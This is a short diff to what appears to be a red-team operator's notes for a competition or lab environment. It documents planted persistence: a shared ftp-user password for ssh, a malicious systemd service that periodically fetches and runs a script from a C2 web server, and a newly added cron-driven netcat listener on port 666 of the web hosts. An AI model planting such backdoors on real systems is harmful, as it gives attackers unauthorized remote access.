@@ -21,6 +21,9 @@ ssh into the ftp user on any box using the password *cybersec*
 ## malicious systemd service
 You can put a script named run.sh on a webserver (port 8080) on the c2 host and the malicious systemd service will periodically try to run it.
 
+## crontab nc listener
+run `nc -v <host> 666` to connect to port 666 on any of the web hosts.
+
 - Run walls
   - `wall "Hello there"`
 - Echo text to terminal
